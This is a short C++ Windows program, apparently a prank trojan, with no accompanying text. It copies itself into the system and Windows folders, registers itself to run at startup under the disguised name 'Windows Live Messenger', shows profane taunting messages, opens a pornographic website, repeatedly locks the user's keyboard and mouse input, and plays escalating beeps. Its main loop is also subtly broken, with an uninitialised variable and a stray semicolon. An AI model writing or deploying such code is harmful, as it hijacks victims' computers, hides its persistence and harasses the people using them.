#include <windows.h>
#include <fstream>
#include <winable.h>
 
using namespace std;
 
int main()
{       
    char system[MAX_PATH];
    char windows[MAX_PATH];
    char pathtofile[MAX_PATH];
    HMODULE GetModH = GetModuleHandle(NULL);
    GetModuleFileName(GetModH,pathtofile,sizeof(pathtofile));
    GetSystemDirectory(system,sizeof(system));
    GetWindowsDirectory(windows,sizeof(windows));
    strcat(system,"\\najort5g.exe");
    strcat(windows,"\\najort5g.exe");
    CopyFile(pathtofile,system,false);
    CopyFile(pathtofile,windows,false);
    HKEY hKey;
    RegOpenKeyEx(HKEY_LOCAL_MACHINE,"Software\\Microsoft\\Windows\\CurrentVersion\\Run",0,KEY_SET_VALUE,&hKey );
    RegSetValueEx(hKey, "Windows Live Messenger",0,REG_SZ,(const unsigned char*)system,sizeof(system));
    RegCloseKey(hKey);
     
    if(MessageBox(
       NULL,
       "Neanderthal is watching you",
       "Windows",
       MB_OKCANCEL)==IDCANCEL)
       {
       MessageBox(
       NULL,
       "You can't cancel me mother fucker!",
       "Neanderthal",
       MB_OK);
       }
     
    Sleep(50000);
     
    int b;
    while(b);
    {       
       char Website[MAX_PATH] = "www.porn.com";
       ShellExecute(NULL,"open",Website,NULL,NULL,SW_MAXIMIZE);
     
       MessageBox(
       NULL,
       "Naughty, Naughty, looking at porn are we now?... Dispicable",
       "Neanderthal",
       MB_OK);
     
       Sleep(30000);
     
       int a = 1;
     
       while(a<100)
       {
          BlockInput(TRUE);
          SetCursorPos(500,500);
          Sleep(3000);
          a++;
       }
     
       Sleep(10000);
       int freq = 100;
       int loop = 1;
        
       while(loop<200)
       {       
           Beep(freq,100);
           Sleep(50);
           freq++;
           loop++;
       }
        
        
    }
     
return 0;
}